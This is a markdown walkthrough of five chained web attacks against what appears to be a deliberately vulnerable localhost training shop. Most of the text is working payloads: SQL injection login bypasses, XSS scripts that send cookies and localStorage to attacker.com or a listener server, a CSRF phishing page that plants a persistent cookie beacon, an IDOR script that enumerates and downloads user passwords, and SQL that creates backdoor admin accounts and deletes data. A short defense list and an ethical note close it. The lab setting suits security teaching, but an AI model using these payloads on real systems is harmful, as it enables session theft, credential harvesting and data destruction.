# 🎯 Attack Scenarios - Web Attack Chaining

This document provides step-by-step walkthroughs of real-world attack scenarios demonstrating how individual vulnerabilities can be chained together for maximum impact.

## Table of Contents

1. [Scenario 1: SQL Injection → Authentication Bypass → Privilege Escalation](#scenario-1-sql-injection--authentication-bypass--privilege-escalation)
2. [Scenario 2: XSS → Session Hijacking → Account Takeover](#scenario-2-xss--session-hijacking--account-takeover)
3. [Scenario 3: IDOR → Data Exfiltration → Credential Harvesting](#scenario-3-idor--data-exfiltration--credential-harvesting)
4. [Scenario 4: CSRF + XSS → Persistent Backdoor](#scenario-4-csrf--xss--persistent-backdoor)
5. [Scenario 5: SQL Injection → Database Dump → Full Compromise](#scenario-5-sql-injection--database-dump--full-compromise)

---

## Scenario 1: SQL Injection → Authentication Bypass → Privilege Escalation

**Objective:** Gain admin access without knowing credentials

### Step 1: Identify SQL Injection Point

Navigate to the login page: http://localhost:3000/login.html

### Step 2: Test for SQL Injection

Try a basic payload in the username field:
```
Username: admin' OR '1'='1' --
Password: anything
```

**Result:** Successfully bypassed authentication!

### Step 3: Direct Admin Login

Since we know the admin username, we can log in directly:
```
Username: admin' --
Password: [leave empty]
```

**Result:** Logged in as admin with full privileges!

### Step 4: Access Admin Panel

Navigate to: http://localhost:3000/admin.html

Now you have full administrative control:
- View all users and orders
- Add/modify/delete products
- Execute arbitrary SQL queries

### Step 5: Create Persistent Backdoor

Go to Admin Panel → Products → Add Product

Create a product with XSS payload in description:
```
Name: Luxury Backdoor Watch
Description: <script>fetch('http://attacker.com/steal?data=' + btoa(document.cookie + '|' + localStorage.getItem('session')))</script>
Price: 1
Stock: 1
```

**Impact:** 
- Complete system compromise
- Admin access without credentials
- Persistent backdoor via XSS
- Session hijacking capability

---

## Scenario 2: XSS → Session Hijacking → Account Takeover

**Objective:** Steal admin session and take over their account

### Step 1: Set Up Attack Server

Create a simple server to receive stolen data:
```bash
# On attacker machine
python3 -m http.server 8080
# Listen for incoming requests
```

Or use a service like RequestBin, Webhook.site, etc.

### Step 2: Inject XSS Payload in Review

1. Browse to any product
2. Login as regular user (user/user123)
3. Add a review with the following payload:

```javascript
<script>
fetch('http://YOUR_SERVER:8080/steal?cookie=' + document.cookie + '&user=' + encodeURIComponent(JSON.stringify({
  cookies: document.cookie,
  localStorage: Object.keys(localStorage).reduce((obj, key) => {
    obj[key] = localStorage[key];
    return obj;
  }, {}),
  page: window.location.href
})));
</script>
```

### Step 3: Wait for Admin to View

When admin views this product and the reviews section, the JavaScript executes in their browser context.

### Step 4: Capture Session Token

Your server receives:
```
GET /steal?cookie=session=1_1768212345678&user=...
```

### Step 5: Use Stolen Session

Open browser console and execute:
```javascript
document.cookie = "session=1_1768212345678";
location.reload();
```

**Result:** You're now logged in as admin!

### Step 6: Maintain Persistence

1. Create a new admin account via SQL injection:
```sql
INSERT INTO users (username, password, role) 
VALUES ('backdoor', 'secret123', 'admin')
```

2. Or change your own account role:
```sql
UPDATE users SET role='admin' WHERE username='user'
```

**Impact:**
- Complete account takeover
- Session hijacking
- Persistent admin access
- Full system control

---

## Scenario 3: IDOR → Data Exfiltration → Credential Harvesting

**Objective:** Extract all user credentials and personal information

### Step 1: Login as Regular User

```
Username: user
Password: user123
```

### Step 2: Discover IDOR Vulnerability

Navigate to: http://localhost:3000/dashboard.html

Go to "Profile" section and notice the IDOR demo feature.

### Step 3: Enumerate All Users

Open browser console and run:

```javascript
async function enumerateUsers() {
  const users = [];
  
  for (let id = 1; id <= 100; id++) {
    try {
      const response = await fetch(`/api/users/${id}`);
      if (response.ok) {
        const user = await response.json();
        users.push(user);
        console.log(`[${id}] ${user.username} : ${user.password} (${user.email}) [${user.role}]`);
      }
    } catch (e) {
      console.error(`Error fetching user ${id}`);
    }
    
    // Small delay to avoid rate limiting
    await new Promise(resolve => setTimeout(resolve, 100));
  }
  
  return users;
}

const allUsers = await enumerateUsers();
console.table(allUsers);
```

### Step 4: Export Data

```javascript
// Download as JSON
const dataStr = JSON.stringify(allUsers, null, 2);
const dataBlob = new Blob([dataStr], { type: 'application/json' });
const url = URL.createObjectURL(dataBlob);
const link = document.createElement('a');
link.href = url;
link.download = 'stolen_credentials.json';
link.click();
```

### Step 5: Enumerate Orders (Same Technique)

```javascript
async function enumerateOrders() {
  const orders = [];
  
  for (let id = 1; id <= 500; id++) {
    try {
      const response = await fetch(`/api/orders/${id}`);
      if (response.ok) {
        const order = await response.json();
        orders.push(order);
        console.log(`Order #${id}: User ${order.user_id}, Product ${order.product_id}, $${order.total_price}`);
      }
    } catch (e) {}
    
    await new Promise(resolve => setTimeout(resolve, 50));
  }
  
  return orders;
}

const allOrders = await enumerateOrders();
```

**Impact:**
- Complete user database exfiltration
- All plain text passwords exposed
- Personal information theft
- Order history and purchase patterns revealed
- Privacy breach

---

## Scenario 4: CSRF + XSS → Persistent Backdoor

**Objective:** Force admin to create a malicious product with persistent XSS

### Step 1: Create Malicious HTML Page

Save as `csrf_attack.html`:

```html
<!DOCTYPE html>
<html>
<head>
  <title>Free Luxury Watch!</title>
</head>
<body>
  <h1>Click here to claim your free Rolex!</h1>
  <img src="luxury-watch.jpg" onerror="exploit()">
  
  <script>
  function exploit() {
    // This will execute in admin's browser when they visit this page
    // while logged into the vulnerable app
    
    const maliciousProduct = {
      name: 'Special Offer',
      brand: 'Rolex',
      description: '<script>setInterval(function(){fetch("http://attacker.com/beacon?cookie="+document.cookie)},5000)</script>',
      price: 1,
      image: 'rolex.jpg',
      stock: 999
    };
    
    fetch('http://localhost:3000/api/admin/products', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(maliciousProduct)
    }).then(response => {
      console.log('Malicious product created!');
    });
  }
  </script>
</body>
</html>
```

### Step 2: Social Engineering

Send link to admin via:
- Phishing email
- Chat message  
- Forum post
- Any communication channel

### Step 3: Admin Clicks Link

When admin visits the malicious page while logged into the app:
- CSRF attack creates new product
- Product contains XSS payload
- XSS payload creates persistent backdoor

### Step 4: Persistent Monitoring

Every time ANY user (including admin) views that product:
- Sends beacon to attacker every 5 seconds
- Steals session cookies
- Enables real-time monitoring

**Impact:**
- Persistent backdoor
- Continuous session harvesting
- Long-term compromise
- Affects all users

---

## Scenario 5: SQL Injection → Database Dump → Full Compromise

**Objective:** Complete database extraction and system takeover

### Step 1: Login via SQL Injection

```
Username: admin' --
Password: [empty]
```

### Step 2: Access Debug SQL Panel

Navigate to: http://localhost:3000/admin.html

Go to "Debug SQL" section.

### Step 3: Enumerate Database Schema

```sql
SELECT name FROM sqlite_master WHERE type='table';
```

**Result:** Lists all tables: users, products, orders, reviews, sessions

### Step 4: Dump All Tables

**Users Table:**
```sql
SELECT * FROM users;
```

**Products Table:**
```sql
SELECT * FROM products;
```

**Orders Table:**
```sql
SELECT * FROM orders;
```

**Reviews Table:**
```sql
SELECT * FROM reviews;
```

**Sessions Table:**
```sql
SELECT * FROM sessions;
```

### Step 5: Create Admin Backdoor

```sql
INSERT INTO users (username, password, email, role) 
VALUES ('superadmin', 'P@ssw0rd!123', 'backdoor@evil.com', 'admin');
```

### Step 6: Extract Active Sessions

```sql
SELECT s.session_token, s.user_id, u.username, u.role, s.created_at
FROM sessions s
JOIN users u ON s.user_id = u.id
WHERE u.role = 'admin'
ORDER BY s.created_at DESC;
```

Use these tokens to impersonate active admin sessions!

### Step 7: Modify Data (Optional but Destructive)

**Change all prices to $1:**
```sql
UPDATE products SET price = 1;
```

**Promote all users to admin:**
```sql
UPDATE users SET role = 'admin';
```

**Delete all orders:**
```sql
DELETE FROM orders;
```

**Impact:**
- Complete database compromise
- All data exfiltrated
- Persistent backdoor accounts created
- Data integrity destroyed
- Full system control
- Potential for data destruction

---

## 🔗 Advanced Attack Chains

### Chain 1: Reconnaissance → Exploitation → Persistence

```
1. SQL Injection (Search) → Discover database structure
2. IDOR → Enumerate all users
3. SQL Injection (Login) → Bypass authentication  
4. XSS (Reviews) → Inject persistent backdoor
5. CSRF → Create additional admin accounts
6. SQL Injection (Debug Panel) → Full database control
```

### Chain 2: Social Engineering → Privilege Escalation

```
1. XSS in Reviews → Steal user session
2. IDOR → Access user's orders  
3. CSRF + XSS → Force user to create malicious content
4. Session Prediction → Guess admin session
5. SQL Injection → Elevate to admin
6. Arbitrary SQL → Complete takeover
```

## 🛡️ Defense Strategies

For each attack:

1. **SQL Injection** → Parameterized queries, input validation
2. **XSS** → Output encoding, CSP headers, HTTPOnly cookies
3. **IDOR** → Authorization checks, indirect references
4. **CSRF** → CSRF tokens, SameSite cookies
5. **Weak Auth** → Password hashing, MFA, rate limiting
6. **Info Disclosure** → Generic errors, remove debug endpoints

## 📊 Attack Impact Matrix

| Vulnerability | Severity | Ease of Exploitation | Impact |
|--------------|----------|---------------------|--------|
| SQL Injection | Critical | Easy | Complete Compromise |
| XSS | High | Medium | Session Hijacking |
| IDOR | High | Easy | Data Breach |
| CSRF | Medium | Medium | Unauthorized Actions |
| Weak Sessions | High | Medium | Account Takeover |
| Info Disclosure | Medium | Easy | Attack Facilitation |

---

## 🎓 Learning Objectives

After completing these scenarios, you should understand:

- How vulnerabilities chain together for greater impact
- The importance of defense in depth
- Why fixing individual vulnerabilities isn't enough
- Real-world attack methodologies
- The attacker's perspective and thinking process

## ⚠️ Ethical Reminder

**These techniques should ONLY be used:**
- In authorized testing environments
- On systems you own or have permission to test
- For educational and defensive purposes
- To improve your own security posture

**NEVER:**
- Attack systems without authorization
- Use these techniques maliciously
- Exploit vulnerabilities for personal gain
- Cause harm to others

---

**Happy (Ethical) Hacking! 🔒**
